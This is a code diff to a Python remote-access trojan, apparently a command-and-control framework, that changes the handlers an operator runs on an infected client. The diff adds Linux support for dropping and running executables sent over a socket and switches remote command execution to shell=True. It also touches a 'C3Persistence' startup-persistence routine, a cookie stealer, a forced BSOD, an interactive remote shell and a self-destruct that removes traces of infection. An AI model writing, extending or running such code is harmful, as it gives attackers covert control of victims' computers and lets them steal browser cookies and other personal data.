@@ -4,11 +4,14 @@ from shared.extras.double_command import (
     CommandResult,
     DoubleCommand,
     ArgumentType,
+    OSType,
     recieve_maximum_bytes,
+    recieve_boolean,
     recieve_integer,
     recieve_string,
     recieve_bytes,
     recieve_float,
+    send_boolean,
     send_integer,
     send_string,
     send_float,
@@ -95,18 +98,26 @@ class LaunchExecutableFile(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
         import subprocess
+        import tempfile
         import random
+        import stat
+        import sys
         import os
 
-        exe_contents = recieve_bytes(sock)
-        if exe_contents == b"EXIT":
+        executable_contents = recieve_bytes(sock)
+        if executable_contents == b"EXIT":
             return
-        exe_path = f"{os.getenv('TEMP')}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}.exe"
+        executable_path = f"{tempfile.gettempdir()}/{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=5))}{'.exe' if sys.platform == "win32" else ''}"
+        if sys.platform != "win32":
+            os.chmod(executable_path, os.stat(executable_path).st_mode | stat.S_IEXEC)
         try:
-            with open(exe_path, "wb") as tmp_exe_fd:
-                tmp_exe_fd.write(exe_contents)
+            with open(executable_path, "wb") as tmp_exe_fd:
+                tmp_exe_fd.write(executable_contents)
             proc = subprocess.Popen(
-                exe_path, creationflags=subprocess.CREATE_NEW_CONSOLE
+                executable_path,
+                creationflags=(
+                    subprocess.CREATE_NEW_CONSOLE if sys.platform == "win32" else 0
+                ),
             )
             send_integer(sock, proc.pid)
         except TimeoutError:
@@ -147,7 +158,7 @@ class LaunchExecutableFile(DoubleCommand):
         return CommandResult(DoubleCommandResult.success, proc_pid)
 
 
-@add_double_command("invoke_bsod", "invoke_bsod", "Invokes a BSOD on the client", [])
+@add_double_command("invoke_bsod", "invoke_bsod", "Invokes a BSOD on the client", [], supported_os=[OSType.ms_windows])
 class InvokeBSOD(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
@@ -190,7 +201,7 @@ class InvokeBSOD(DoubleCommand):
     "show_image [ local image path ]",
     "Displays an image on the clients screen",
     [ArgumentType.string],
-    required_client_modules=["Pillow"],
+    required_client_modules=["Pillow"]
 )
 class ShowImage(DoubleCommand):
     @staticmethod
@@ -355,7 +366,7 @@ class RunCommand(DoubleCommand):
         command = recieve_string(sock, False)
 
         try:
-            subprocess.Popen(command)
+            subprocess.Popen(command, shell=True)
             sock.sendall(b"y")
         except OSError:
             try:
@@ -515,7 +526,7 @@ class CaptureWebcamImage(DoubleCommand):
     "add_persistence",
     "Adds the client infection to PC startup",
     [],
-    str,
+    str, supported_os=[OSType.ms_windows]
 )
 class AddPersistence(DoubleCommand):
     @staticmethod
@@ -533,6 +544,11 @@ class AddPersistence(DoubleCommand):
             except OSError:
                 pass
             shutil.rmtree(folder_path, ignore_errors=True)
+
+        try:
+            name = recieve_string(sock, True)
+        except OSError:
+            return
 
         key_name = "C3Persistence"
         folder_name = key_name
@@ -568,7 +584,9 @@ class AddPersistence(DoubleCommand):
             server_file.write(ADD_SELF_TO_PATH + server_file_contents)
         with open(startup_script_path, "w") as startup_script:
             startup_script.write(
-                CLIENT_STARTUP_SCRIPT.replace("{{ TARGET_DIR }}", folder_path)
+                CLIENT_STARTUP_SCRIPT.replace("{{ TARGET_DIR }}", folder_path).replace(
+                    "{{ NAME }}", name
+                )
             )
 
         try:
@@ -595,6 +613,12 @@ class AddPersistence(DoubleCommand):
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
+        try:
+            send_string(client.socket, client.name)
+        except OSError:
+            print("Failed to send client name to client")
+            return CommandResult(DoubleCommandResult.conn_error)
+
         try:
             install_path = recieve_string(client.socket, True)
         except OSError:
@@ -711,6 +735,7 @@ class Shutdown(DoubleCommand):
     "self_destruct",
     "Self destructs and removes all trace of infection on the client side",
     [],
+    supported_os=[OSType.ms_windows]
 )
 class SelfDestruct(DoubleCommand):
     @staticmethod
@@ -767,6 +792,7 @@ class SelfDestruct(DoubleCommand):
     "Downloads cookies from the client",
     [],
     str,
+    supported_os=[OSType.ms_windows]
 )
 class CookieStealer(DoubleCommand):
     @staticmethod
@@ -1195,7 +1221,10 @@ class OpenURL(DoubleCommand):
 
 
 @add_double_command(
-    "ls", "ls [ directory ]", "Lists a directory on the client", [ArgumentType.string]
+    "ls",
+    "ls [ directory ]",
+    "Lists a directory on the client",
+    [ArgumentType.optional_string],
 )
 class ListDirectory(DoubleCommand):
     @staticmethod
@@ -1222,6 +1251,9 @@ class ListDirectory(DoubleCommand):
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
+        if len(params) == 0:
+            params = (".",)
+
         try:
             send_string(client.socket, params[0])
         except OSError:
@@ -1700,6 +1732,7 @@ class GetClipboard(DoubleCommand):
     "popup [ title ] [ message ]",
     "Displays a popup message on the clients screen",
     [ArgumentType.string, ArgumentType.string],
+    supported_os=[OSType.ms_windows]
 )
 class Popup(DoubleCommand):
     @staticmethod
@@ -1851,9 +1884,10 @@ class Geolocate(DoubleCommand):
     "shell",
     "Runs and interactive shell on the client",
     [],
+    supported_os=[OSType.ms_windows],
     no_new_process=True,
     no_multitask=True,
-    max_selected=1,
+    max_selected=1
 )
 class Shell(DoubleCommand):
     @staticmethod
